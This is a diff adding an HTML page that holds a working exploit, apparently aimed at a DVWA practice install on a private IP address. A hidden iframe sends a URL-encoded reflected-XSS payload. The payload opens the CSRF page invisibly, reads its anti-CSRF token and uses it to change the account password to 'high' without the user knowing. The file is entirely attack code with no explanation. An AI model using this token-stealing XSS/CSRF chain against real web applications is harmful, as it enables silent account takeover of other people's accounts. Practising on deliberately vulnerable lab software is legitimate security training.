@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe src="http://10.6.66.42/dvwa/vulnerabilities/xss_r/?name=%3Ciframe+id%3D%22csrf_vuln%22+src%3D%22http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%22+style%3D%22visibility%3A+hidden%3B%22+onload%3D%22var+iframe+%3D+document.getElementById(%27csrf_vuln%27)%3B%0A+var+doc+%3D+iframe.contentWindow.document%3B+var+token+%3D+doc.getElementsByName(%27user_token%27)%5B0%5D.value%3B+const+http+%3D+new+XMLHttpRequest()%3B+const+url+%3D+%27http%3A%2F%2F10.6.66.42%2Fdvwa%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dhigh%26password_conf%3Dhigh%26Change%3DChange%26user_token%3D%27%2Btoken%3B+http.open(%27GET%27%2C+url)%3B+http.send()%3B%22%3E%3C%2Fiframe%3E", style="visibility: hidden;">
+  </iframe>
+</body>
+</html>
